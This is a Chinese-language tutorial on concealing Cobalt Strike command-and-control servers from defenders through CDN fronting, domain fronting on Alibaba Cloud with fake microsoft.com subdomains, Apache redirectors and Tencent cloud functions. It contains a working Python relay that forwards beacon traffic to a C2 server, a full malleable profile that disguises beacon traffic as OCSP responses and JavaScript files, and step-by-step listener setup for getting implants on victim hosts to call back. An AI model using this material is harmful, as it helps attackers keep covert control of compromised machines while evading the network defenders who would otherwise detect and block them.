[TOC]

# 1 CDN技术

## 1.1 CDN技术原理

CDN加速原理，网上也很多说cdn，大家也都懂CDN为什么可以作为安全措施之一，就是因为他可以隐藏我们的真实IP，为C2提供保护，以免被目标运维发现直接封掉IP。

**原理：让cdn转发合法的http或者https流量来达到隐藏的目的。**

*那么为什么我把cdn加速放在第二点来说呢？*

因为就目前为主，笔者已知的可用于域前置的厂商仅限于阿里云，作为国内的互联网大厂，它是需要我们实名的！作为普通人的笔者自然没有那么多身份证和对应的手机号去实名，所以退而求其次，选择：cloudflare，因为cloudflare有免费的cdn服务，且不需要实名。

## 1.2 配置流程总结

1. 配置了cdn
2. 拥有一个公网域名
3. 配置cdn的A记录解析使其能解析到C2的ip
4. 将公网域名填写到cs listener的host处并填写可用的端口

## 1.3  CND技术隐藏C2的优缺点

#### 优点：

相对匿名。（全程不要实名或实名制度不严格）

#### 缺点：

使用上CDN之后，**只能用443,80两个端口**，其他端口不上线；

cs不能使用进程注入、不能spawn、不能使用stager，只能用stageless。

## 1.4 技术实现重点

1. 一个不备案的域名，否则这个方式毫无用处；
2. 这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https。

#### 可达到的效果：

受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。

## 1.5 技术实现参考

[反溯源-cs和msf域名上线](https://xz.aliyun.com/t/5728)

[利用CDN隐藏C2地址](https://www.cnblogs.com/websecyw/p/11239733.html)

[使用CDN隐藏c2流量 | SERN](http://blog.sern.site:8000/2020/08/03/使用CDN隐藏c2流量/)

# 2 域前置法

## 2.1 域前置（Domain Fronting）简介

域前置*是*一种隐藏真实的连接端点来规避互联网审查的技术。此技术的原理为在不同通信层使用不同的域名。在明文的DNS请求和TLS服务器名称指示（SNI）中使用无害的域名来初始化连接、公布给审查者，而实际要连接的被封锁域名仅在创建加密的HTTPS连接后发出，使其不以明文暴露给网络审查者。

原理：同一个cdn厂商下倘若有两个域名a.com，b.com，这时候我们使用curl命令访问第一个a.com并将host名改为b.com这时候，实际访问的是b.com的内容。而一般的监测机制是不会检测host头的。

## 2.2 域前置技术原理

通过CDN节点将流量转发到真实的C2服务器，其中CDN节点ip通过识别请求的Host头进行流量转发。利用我们配置域名的高可信度，我们可以设置一个微软或者谷歌的子域名，可以有效的规避DLP，agent等流量检测。

![image-20210517172945995](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518100213.png)

域前置技术跟CDN技术比较类似，都是会用到CDN，但域前置技术必须要用https，因为它是基于TLS协议的，域前置还有一个特点是需要修改请求包的host头，修改方法是修改`malleable_profile`文件，[`malleable_profile`文件配置概述](https://shanfenglan.blog.csdn.net/article/details/107791606) ;写了修改方法，而CDN是创建好CDN后直接就可以使用的，不用做过多的配置不过效果也有不同，CDN技术只能用自己的域名，如果自己域名被放进黑名单基本就凉凉，但是域前置技术可以使用别人的高信誉域名来隐藏自己的真实域名，例如用微软的域名伪装自己，当然前提是微软的域名得跟你的域名再同一个CDN下，这种技术现在在不少的CDN厂商下都被禁止了，不一定会利用成功。

### **2.2.1 SNI域前置**

SNI，中文：服务器名称指示，是 TLS 的扩展，允许在相同的IP地址上提供多个安全（HTTPS）网站（或其他任何基于TLS的服务），而不需要所有这些站点使用相同的TLS证书。白话：用来解决一个服务器拥有多个域名的情况。

TLS，**传输层安全性协议**（英语：Transport Layer Security，缩写作**TLS**），跟其前身SSL一样，是为互联网通信提供安全及数据完整性保障。

当我们访问一个http网站的时候，机器会先进行dns解析得到IP，通过IP建立TCP连接，可是正常情况下服务器是如何知道你要访问服务器的哪个网站呢？此时就要在请求头中加入一个host字段，字段表明你要访问的是哪个网站？

比如你你想访问http://www.dark5.net，那么你在建立TCP链接之后，你就要发起http请求

```
GET / HTTP/1.1
Host: www.dark5.net
```

服务器接收到这个请求之后，转给中间件处理，中间件从配置文件中发现该字段对应的文件再发送给客户端

而访问https网站的时候，建立TCP链接后第一步就是请求服务器的证书。而服务器在发送证书时，是不知道浏览器访问的是哪个域名的，所以不能根据不同域名发送不同的证书。因此就引入一个扩展叫SNI，SNI是为了解决一个服务器使用多个域名和证书的SSL/TLS扩展，做法就是在 Client Hello 中补上 Host 信息。

**但是**Host字段的内容不一定要跟我们本来访问的网址一致：

```shell
root@vultr:~# curl -v  https://bing.com
* Rebuilt URL to: https://bing.com/
*   Trying 204.79.197.200...
* TCP_NODELAY set
* Connected to bing.com (204.79.197.200) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use h2
* Server certificate:
*  subject: CN=www.bing.com
*  start date: Jan 19 02:10:20 2021 GMT
*  expire date: Jul 19 02:10:20 2021 GMT
*  subjectAltName: host "bing.com" matched cert's "bing.com"
*  issuer: C=US; O=Microsoft Corporation; CN=Microsoft RSA TLS CA 02
*  SSL certificate verify ok.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55bcd2f6b5c0)
> GET / HTTP/2
> Host: bing.com
> User-Agent: curl/7.58.0
> Accept: */*
>
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
< HTTP/2 301
< cache-control: private
< content-length: 193
< content-type: text/html; charset=utf-8
< location: https://www.bing.com:443/?toWww=1&redig=BF1D7441B42440EEB72F1DB60FD52D97
< set-cookie: MUID=3D2B0567907767DF2DBD0A9491C766A4; domain=bing.com; expires=Fri, 01-Apr-2022 06:08:57 GMT; path=/; secure; SameSite=None
< set-cookie: MUIDB=3D2B0567907767DF2DBD0A9491C766A4; expires=Fri, 01-Apr-2022 06:08:57 GMT; path=/; HttpOnly
< set-cookie: _EDGE_S=F=1&SID=0EC8BF56705D6929269DB0A571ED6852; domain=bing.com; path=/; HttpOnly
< set-cookie: _EDGE_V=1; domain=bing.com; expires=Fri, 01-Apr-2022 06:08:57 GMT; path=/; HttpOnly
< strict-transport-security: max-age=31536000; includeSubDomains; preload
< x-msedge-ref: Ref A: 77C8A1E4ED6E4793AF804BF1761052ED Ref B: SJCEDGE0418 Ref C: 2021-03-07T06:08:57Z
< date: Sun, 07 Mar 2021 06:08:56 GMT
<
<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="https://www.bing.com:443/?toWww=1&amp;redig=BF1D7441B42440EEB72F1DB60FD52D97">here</a>.</h2>
</body></html>
* Connection #0 to host bing.com left intact
```

```shell
root@vultr:~# curl -v -H "host: google.com" https://bing.com
* Rebuilt URL to: https://bing.com/
*   Trying 204.79.197.200...
* TCP_NODELAY set
* Connected to bing.com (204.79.197.200) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use h2
* Server certificate:
*  subject: CN=www.bing.com
*  start date: Jan 19 02:10:20 2021 GMT
*  expire date: Jul 19 02:10:20 2021 GMT
*  subjectAltName: host "bing.com" matched cert's "bing.com"
*  issuer: C=US; O=Microsoft Corporation; CN=Microsoft RSA TLS CA 02
*  SSL certificate verify ok.
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x5633953bc5c0)
> GET / HTTP/2
> host: google.com
> User-Agent: curl/7.58.0
> Accept: */*
>
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
< HTTP/2 400
< x-msedge-ref: 0KG5EYAAAAABYIMDPN5jJR4UrZheAGW71U0pDRURHRTAyMjAARWRnZQ==
< date: Sun, 07 Mar 2021 06:09:44 GMT
<
* Connection #0 to host bing.com left intact
<h2>Our services aren't available right now</h2><p>We're working to restore all services as soon as possible. Please check back soon.</p>0KG5EYAAAAABYIMDPN5jJR4UrZheAGW71U0pDRURHRTAyMjAARWRnZQ==r
```

这个请求的返回值告诉我们：

1. 我们请求的host为Google.com的网站是不存在的，这里的不存在是说在bing.com (204.79.197.200)的服务器内不存在google.com网站。
2. TLS协商跟http请求是分开的
3. 在HTTP请求中发送主机头之前也没有涉及到Google.com

所以那么实际上，我们要做的就是把Host字段内的Google.com替换成恶意的域名dark5.net；把请求的bing.com替换成指向可以解析到dark.net所在服务器的域名，且该域名能被大部分网络设备及运维人员认可为安全域名，即渗透人员说的高信誉域名，这就是域前置的理论内容。

为何域前置又跟CDN扯上关系呢？

![image-20210517174746994](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518100310.png)

如果我们把host的字段直接指向我们的C2的话，那目标就会发现有一个链接与我们c2的IP进行通信，然后把我们的IP加入到黑名单，然后我们就掉线或者一开始就不上线了。

但是如果跟CDN配合起来，目标管理员就只能看到CDN的IP，那么这整个过程就不会发现有恶意资产出现在他们的网络里。

### 2.2.2 SNI域前置实操

实际操作跟理论又有些不一样了，因为该类隐藏C2的技术需要依靠到运营商，而运营商开放出来的功能会因为开发人员的想法而跟原本的理论不一样。

目前，已知可被用来进行SNI域前置的运营商是阿里云。

正常的流程是先有域名，再配置域名走CDN，但是由于阿里云的特性：当 CDN 配置中的源 IP 为阿里云自己厂商的服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器IP进行通信。只要在申请 CDN 时随便填一个没有人绑定过的域名就行，而且这个域名我们可以填成任何高信誉的域名，例如 dark5net.microsoft.com、dark5.microsoft.com 等。

![image-20210517174943781](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518100322.png)

等待5-10分钟后，此时就可以验证一下啦！

```
curl 125.94.49.221 -H "fuck.microsoft.com
```

此时，你在阿里云上开的C2的webserver就能看到你的请求日志啦！



但是如何上线呢？有2种姿势：

1. cs4.0之后的listener下面的host处添加：fuck.microsoft.com

![image-20210517175035404](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518100332.png)

2. 在c2profile内添加http的host：

![image-20210517175210368](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518100341.png)

### 2.2.3 SNI域前置实操小结

通过阿里云来进行域前置的话，跟理论是有些许出入的，比如第一步没有了访问高信誉域名并解析到IP，而是直接跟CDN的IP建立TCP链接后就发送http请求包。

我们来看一则更加接近理论的文章，但是该方法已经失效：https://cloud.tencent.com/developer/article/1555449

而后国外的安全研究人员进行了变更：

https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/

## 2.3  ESNI域前置

TLS1.3引入了ESNI，就是Encrypted SNI，可以让 HTTPS 连接不再暴露 SNI 域名地址。SNI的client host还是会暴漏的，这样防火墙就能检查到你真实访问哪个网站，但是如果对SNI加密后，就不会暴漏，可是GWF不允许ESNI！因为要约束大家不访问某些“不安全”站点，懂了吧？各位就会因为这个限制而无法使用一些国外大佬的思路。

## 2.4 **技术实现重点**

1. **需要基于https**
2. **需要知道cdn上的其他高信誉域名或者ip**
3. **需要修改malleable profile文件**

#### 可达到的效果：

通过一个高信任域名隐藏自己的真实域名与ip，且受害主机上的流量只有跟cdn通信的，不会有跟真实c2的。

## 2.5 技术实现参考

[域前置技术的原理与CS上的实现](https://blog.csdn.net/qq_41874930/article/details/107742843)



# 3 重定向技术

## 3.1 技术原理

这种技术有点像乞丐版的CDN或者域前置技术。总的来说就是得有两台vps，一台做重定向，一台是真正的C2，而受害者只与那台做重定向的机器通信，重定向机器只会转发来自beacon的特定流量到C2控制端主机，对于其他流量可以自定义设置处理方法，一般是采用重定向到一些高信誉域名上例如百度等。

## 3.2 技术实现重点

1. 两台服务器
2. 配置`apache_rewrite`
3. 配置`malleable_profile`文件

## 3.3 重定向技术实现的优缺点

重定向技术对运维人员迷惑效果还是不错的，但对于很专业的运维人员可能效果就没有那么好，而且配置也是最复杂的，如果被发现ban了自己的重定向机器，对于攻击队来说损失也不小，总的来说还是没有cdn的方法好用。

## 3.4 技术实现参考

[利用apache mod_rewrite模块实现重定向技术来隐藏CS的teamserver的原理与实现](https://shanfenglan.blog.csdn.net/article/details/107789018)

# 4 云函数

## 4.1 云函数概念

云函数（Serverless Cloud Function，SCF）为函数即服务 （Function as a Service，FaaS）产品，提供无服务器（Serverless） 和 FaaS 的计算平台。运行方式依赖事件触发。因此在和触发事件源结合时，云函数就可以被触发源所产生的事件触发运行。

## 4.2 技术原理

这个技术的核心原理是利用云函数将我们的请求进行转发（和一些使用第三方应用进行转发是一样的）；C2客户端发出的流量经过 云函数的转发，到达我们的C2服务器，达到隐藏的效果，并且因为云函数的服务器是自带 `CDN` 的，所以为我们的信息传递提供了加速的效果，但是转发的途中有损耗，不能像直接连接那样快，但是足够让我们感受到快乐了。

## 4.3 具体实现

创建测试云函数

首先使用云函数进行创建:

![image-20210518103320100](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112359.png)

![image-20210518103929080](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112413.png)

函数内容：

```python
# coding: utf8
import json,requests,base64
def main_handler(event, context):
   response = {}
   path = None
   headers = None
   try:
       C2='http://x.x.x.x:port' //C2服务器地址
       if 'path' in event.keys():
           path=event['path']
       if 'headers' in event.keys():
           headers=event['headers']
       if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
           resp=requests.get(C2+path,headers=headers,verify=False) 
       else:
           resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
           print(resp.headers)
           print(resp.content)
       response={
           "isBase64Encoded": True,
           "statusCode": resp.status_code,
           "headers": dict(resp.headers),
           "body": str(base64.b64encode(resp.content))[2:-1]
      }
   except Exception as e:
       print('error')
       print(e)
   finally:
       return response
```

PS：在这里排个坑，C2使用域名的话，是不能套 CDN 的，会直接找不到，只能使用纯IP的方式

点击触发管理，创建一个触发器：

![image-20210518105630121](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112426.png)

勾选 API网关触发 并且生成 API 网关，这个时候将我们的云函数发布，并且访问一下 API网关查看效果：

发布：

![image-20210518115034175](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518115037.png)

访问：

![image-20210518115116219](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518115120.png)

可以看到我们访问网关后确实执行了我们的函数，我们在云函数的日志服务中也可以看到：

![image-20210518115152389](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518115201.png)

然后保存发布函数，再到触发条件里面把原来的 API网关触发删除，添加新的网关触发，因为上面我们为了测试是否能够访问到函数，没有勾选集成响应，集成响应不勾选的话，返回的数据格式是 JSON 的格式，对二进制数据不太支持：

选择API网关触发的方式:

![image-20210518104447284](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112446.png)

创建后点击API服务名，跳转编辑网关信息:

![image-20210518114918046](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518114921.png)

新建一个API:

![image-20210518111102821](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112452.png)

新建后点击编辑，将路径修改为“/”:

![image-20210518104632898](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112458.png)

点击下一步，选择之前创建的云函数:

![image-20210518113540085](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518113544.png)

将后端超时时间适当延长，防止stager存在延迟和后端超时时间冲突

勾选响应集成，不然无法执行命令

![image-20210518104734483](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112504.png)

然后直接完成配置

![图片](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112513.png)

![image-20210518111429054](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112519.png)

配置好云函数和 API网关 以后，我们去配置一下 C2 的服务器profile的配置:

```java
set sample_name "t";
set sleeptime "3000";
set jitter   "0";
set maxdns   "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

  set uri "/api/x";

  client {
      header "Accept" "*/*";
      metadata {
          base64;
          prepend "SESSIONID=";
          header "Cookie";
      }
  }

  server {
      header "Content-Type" "application/ocsp-response";
      header "content-transfer-encoding" "binary";
      header "Server" "Nodejs";
      output {
          base64;
          print;
      }
  }
}
http-stager {
  set uri_x86 "/vue.min.js";
  set uri_x64 "/bootstrap-2.min.js";
}
http-post {
  set uri "/api/y";
  client {
      header "Accept" "*/*";
      id {
          base64;
          prepend "JSESSION=";
          header "Cookie";
      }
      output {
          base64;
          print;
      }
  }

  server {
      header "Content-Type" "application/ocsp-response";
      header "content-transfer-encoding" "binary";
      header "Connection" "keep-alive";
      output {
          base64;
          print;
      }
  }
}
```

使用该配置文件启动服务端

创建好以后，将这个文件放到CS的根目录下：

![图片](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112528.png)

然后启动 CS 并且加载配置文件：

![图片](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112536.png)

复制一下路径，在监听中填写，监听的类型根据你在函数中填写的来选，如果使用的HTTPS的话就选 HTTPS，使用HTTP就使用HTTP：

![image-20210518111607017](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112542.png)

配置监听器:

![image-20210518112245141](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112549.png)

在 C2 客户端的 WEB日志可以看到请求：

![image-20210518113746366](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518113756.png)

由于网关只提供了80和443端口，所以需要保证自己的vps这两个端口未被占用，且只能监听这两个端口

然后正常做马上线

![image-20210518104916733](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112559.png)

这里可以看到，4.0版本可以同样上线执行命令

本地抓包分析，流量都为腾讯云流量

![image-20210518104952028](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/C2/Concealment/images_20210518112608.png)

## 4.4 云函数技总结

1. 一个监听器需要一个云函数，但是比较尴尬的地方在于云函数默认只能走80和443，所以监听器也只能设置为这两个端口上
2. 云函数自带一层cdn，所以上线后的外网IP会一直变化
3. 在设置https的监听器时记得把转发URL写成hxxps://x.x.x.x
4. 如果需要使用自己申请的https证书，就需要在profile里进行修改
5. 云函数的超时时间不宜设置过小，stager下发命令会需要一定的时间
6. 总的来说降低了c2被发现的风险，但是溯源还是有迹可循的，如果需要更完美的隐藏自己请配合多种技术多多实践～

## 4.5 技术实现参考

[为你的C2隐藏与加速-WgpSec狼组安全团队]([为你的C2隐藏与加速 (qq.com)](https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA))

[通过云函数隐藏C2流量-雷神众测]([通过云函数隐藏C2流量 (qq.com)](https://mp.weixin.qq.com/s/lL3UKCRW0cN4SgQIZl7vYw))

[Fully Functional C2](https://www.dropbox.com/s/2yo4uud6fgbe1t5/Fully Functional C2.pptx)

